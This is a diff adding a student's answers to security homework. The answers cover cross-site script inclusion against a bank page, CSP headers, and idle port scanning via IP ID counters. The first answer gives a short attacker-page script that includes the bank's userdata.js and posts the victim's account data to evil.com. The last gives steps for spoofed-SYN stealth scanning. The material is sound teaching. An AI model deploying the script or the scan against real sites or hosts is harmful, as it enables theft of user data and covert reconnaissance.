@@ -21,10 +21,10 @@
 >
 > Consider a banking web site bank.com where after login the user is taken to a user information page: `https://bank.com/accountInfo.html`
 >
-> The page shows the user's account balances. Here accountInfo.html is a static page: it contains the page layout, but no user data. Towards the bottom of the page a script is included as:
+> The page shows the user's account balances. Here `accountInfo.html` is a static page: it contains the page layout, but no user data. Towards the bottom of the page a script is included as:
 >
 > ```html
-> <script src="//bank.com/userdata.js"></script> (\*)
+> <script src="//bank.com/userdata.js"></script> // (\*)
 > ```
 >
 > The contents of `userdata.js` is as follows:
@@ -45,7 +45,46 @@
 >
 > a) Consider user John Doe who logs into his account at `bank.com` and then visits the URL `https://evil.com/`. Explain how the page at `evil.com` can cause all of John Doe's data to be sent to `evil.com`. Please provide the code contained in the page at `evil.com`. The code can be pseudocode.
 >
-> b) How would you keep `accountInfo.html` as a static page, but prevent the attack from part (a)? You need only change line (\*) and `userdata.js`. Make sure to explain why your defense prevents the attack. (Hint: Try loading the user's data in a way that gives bank.com access to the data, but does not give `evil.com` access. In particular, `userdata.js` need not be a Javascript file)
+> b) How would you keep `accountInfo.html` as a static page, but prevent the attack from part (a)? You need only change line (\*) and `userdata.js`. Make sure to explain why your defense prevents the attack. (Hint: Try loading the user's data in a way that gives `bank.com` access to the data, but does not give `evil.com` access. In particular, `userdata.js` need not be a Javascript file)
+
+### a)
+
+```html
+<script>
+function displayData(data) {
+    fetch("/log", {
+        method: "POST",
+        headers: {
+            "Content-Type": 'application/json',
+        },
+        body: JSON.stringify(data),
+    });
+}
+</script>
+<script src="//bank.com/userdata.js"></script>
+```
+
+### b)
+
+Remove `userdata.js` and replace it with a dynamic JSON file containing user's information. Remember to add proper CORS headers.
+
+`userdata.json`:
+
+```json
+{
+    "name": "John Doe",
+    "AccountNumber": 12345,
+    "Balance": 45
+}
+```
+
+`accountInfo.html`:
+
+```html
+<script>
+fetch("/userdata.json").then(r => r.json()).then(data => displayData(data));
+</script>
+```
 
 ## 4
 
@@ -70,23 +109,54 @@
 >
 > c) What does the following CSP header do: `Content-Security-Policy: sandbox 'allow-scripts'`; Suppose a page loaded from the domain `www.xyz.com` has the sandbox CSP header, as above. This causes the page to be treated as being from a special origin that always fails the same-origin policy, among other restrictions. How does this impact the page's ability to read cookies belonging to `www.xyz.com` using Javascript? Give an example where a web site might want to use this CSP header.
 
+### a)
+
+- Only allow external scripts from the same origin.
+- XSS.
+
+### b)
+
+- Do not allow this page to be embeded in another page, using an `<iframe>` for example.
+- Clickjacking etc.
+
+### c)
+
+- It enables script execution while applying all other sandbox restrictions.
+- Scripts won't be able to read cookies from `www.xyz.com`, since the page is treated as being from a special origin and sop would always fail.
+- Example: A blogging platform where users can create accounts to write HTML/JavaScript-based posts. The platform can use the sandboxing feature to display users' posts in a controlled environment, minimizing the risk of script-based attacks impacting other users or the main site.
+
 ## 6
 
 > **Stealth Port Scanning**
 >
-> Recall that the IP packet header contains a 16-bit identification field that is used for assembling packet fragments. IP mandates that the identification field be unique for each packet for a given (SourceIP,DestIP) pair. A common method for implementing the identification field is to maintain a single counter that is incremented by one for every packet sent. The current value of the counter is embedded in each outgoing packet. Since this counter is used for all connections to the host we say that the host implements a global identification field.
+> Recall that the IP packet header contains a 16-bit identification field that is used for assembling packet fragments. IP mandates that the identification field be unique for each packet for a given `(SourceIP,DestIP)` pair. A common method for implementing the identification field is to maintain a single counter that is incremented by one for every packet sent. The current value of the counter is embedded in each outgoing packet. Since this counter is used for all connections to the host we say that the host implements a global identification field.
 >
-> a) Suppose a host P (whom we'll call the Patsy for reasons that will become clear later) implements a global identification field. Suppose further that P responds to ICMP ping requests. You control some other host A. How can you test if P sent a packet to anyone (other than A) within a certain one minute window? You are allowed to send your own packets to P.
+> a) Suppose a host $P$ (whom we'll call the Patsy for reasons that will become clear later) implements a global identification field. Suppose further that $P$ responds to ICMP ping requests. You control some other host $A$. How can you test if $P$ sent a packet to anyone (other than $A$) within a certain one minute window? You are allowed to send your own packets to $P$.
 >
-> b) Your goal now is to test whether a victim host V is running a server that accepts connections to port n (that is, test if V is listening on port n). You wish to hide the identity of your machine A and therefore A cannot directly send a packet to V, unless that packet contains a spoofed source IP address. Explain how to use the patsy host P to test if V accepts connections to port n.
+> b) Your goal now is to test whether a victim host $V$ is running a server that accepts connections to port $n$ (that is, test if $V$ is listening on port $n$). You wish to hide the identity of your machine $A$ and therefore $A$ cannot directly send a packet to $V$, unless that packet contains a spoofed source IP address. Explain how to use the patsy host P to test if $V$ accepts connections to port $n$.
 >
 > Hint: Recall the following facts about TCP:
 >
-> - A host that receives a SYN packet to an open port n sends back a SYN/ACK
-response to the source IP.
-> - A host that receives a SYN packet to a closed port n sends back a RST packet to the source IP.
+> - A host that receives a SYN packet to an open port $n$ sends back a SYN/ACK response to the source IP.
+> - A host that receives a SYN packet to a closed port $n$ sends back a RST packet to the source IP.
 > - A host that receives a SYN/ACK packet that it is not expecting sends back a RST packet to the source IP.
 > - A host that receives a RST packet sends back no response.
+
+### a)
+
+1. Ping $P$ and record the id from response header as $x$
+2. Wait a minute
+3. Ping $P$ again and record the id from response header as $y$
+4. If $y\equiv x+1\mod 2^{16}$, then $P$ most likely hasn't sent a packet to anyone; If not, $P$ definitely has sent a packet to someone.
+
+### b)
+
+1. Ping $P$ and record the id from response header as $x$
+2. Send $V$ a SYN packet on port $n$ with spoofed source IP = $P$
+3. Wait some time, ping $P$ again and record the id from response header as $y$
+4. If $y\equiv x+1\mod 2^{16}$, then the port $n$ is not open; If $y\equiv x+2\mod 2^{16}$, the port is most likely open.
+
+![](./attachments/1713777268200.jpeg)
 
 ## 7
 
